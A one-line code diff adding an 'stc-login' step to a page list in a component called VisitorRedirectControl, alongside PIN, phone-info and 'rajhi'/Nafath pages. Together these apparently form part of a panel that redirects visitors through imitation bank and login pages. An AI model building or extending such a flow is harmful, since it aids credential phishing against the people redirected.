@@ -79,6 +79,7 @@ const pages = [
   { id: "confi", name: "التحقق PIN", icon: Shield, step: 6 },
   { id: "phone-info", name: "معلومات الهاتف", icon: Smartphone, step: 7 },
   { id: "rajhi", name: "نفاذ", icon: Shield, step: 8 },
+  { id: "stc-login", name: "stc-login", icon: Shield, step:9 },
 ];
 
 export function VisitorRedirectControl({
